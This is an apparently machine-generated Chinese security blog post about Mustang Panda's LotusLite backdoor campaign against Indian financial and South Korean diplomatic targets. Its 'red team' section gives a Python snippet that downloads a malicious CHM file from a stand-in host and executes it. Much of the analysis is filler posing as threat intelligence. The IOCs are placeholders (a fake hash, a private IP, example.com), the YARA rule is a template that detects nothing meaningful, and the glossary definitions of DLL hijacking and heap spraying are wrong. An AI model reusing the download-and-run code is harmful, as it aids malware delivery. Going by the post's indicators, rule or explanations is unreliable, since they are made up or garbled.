---
layout: post
title:  "中國駭客Mustang Panda針對印度金融機構、韓國外交政策圈，散布後門程式LotusLite"
date:   2026-04-23 07:26:42 +0000
categories: [security]
severity: high
---

# 🔥 解析 Mustang Panda 的 LotusLite 攻擊：技術分析與防禦策略

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 8.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: `Heap Spraying`, `DLL Hijacking`, `HTTPS 通訊`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)

* **Root Cause**: LotusLite 惡意程式利用了 Microsoft 合法簽章的漏洞，允許駭客透過 HTTPS 通訊與 C2 伺服器進行連線。這個漏洞是由於 Microsoft 的簽章機制沒有正確驗證檔案的完整性，導致駭客可以使用合法簽章的檔案進行惡意活動。
* **攻擊流程圖解**:
	1. User Input -> CHM 檔下載
	2. CHM 檔執行 -> JavaScript 執行
	3. JavaScript -> DLL 載入
	4. DLL -> RCE
* **受影響元件**: Microsoft Windows 10, Windows Server 2019

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)

* **攻擊前置需求**: 網路存取權限
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 下載 CHM 檔
    url = "https://example.com/malicious.chm"
    response = requests.get(url)
    with open("malicious.chm", "wb") as f:
        f.write(response.content)
    
    # 執行 CHM 檔
    import os
    os.system("start malicious.chm")
    
    ```
* **繞過技術**: 使用 HTTPS 通訊與 C2 伺服器進行連線，避免被偵測

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)

* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | C:\Windows\Temp\malicious.dll |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule malicious_chm {
        meta:
            description = "Detects malicious CHM files"
            author = "Your Name"
        strings:
            $a = "malicious.chm"
        condition:
            $a at 0
    }
    
    ```
* **緩解措施**: 更新 Microsoft Windows 10, Windows Server 2019 至最新版本，禁用不必要的服務，限制使用者權限

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)

* **DLL Hijacking (DLL 劫持)**: 想像兩個程式同時去讀同一個 DLL 檔。技術上是指駭客透過 DLL 檔的漏洞，將惡意程式碼注入到系統中，從而實現 RCE。
* **Heap Spraying (堆疊噴灑)**: 想像駭客將大量的惡意程式碼噴灑到堆疊中。技術上是指駭客透過堆疊的漏洞，將惡意程式碼注入到系統中，從而實現 RCE。
* **HTTPS 通訊 (HTTPS 通信)**: 想像兩個程式之間的安全通訊。技術上是指使用 HTTPS 協議進行通訊，從而確保數據的安全性。

## 5. 🔗 參考文獻與延伸閱讀

* [原始報告](https://www.ithome.com.tw/news/175229)
* [MITRE ATT&CK](https://attack.mitre.org/techniques/T1204/)


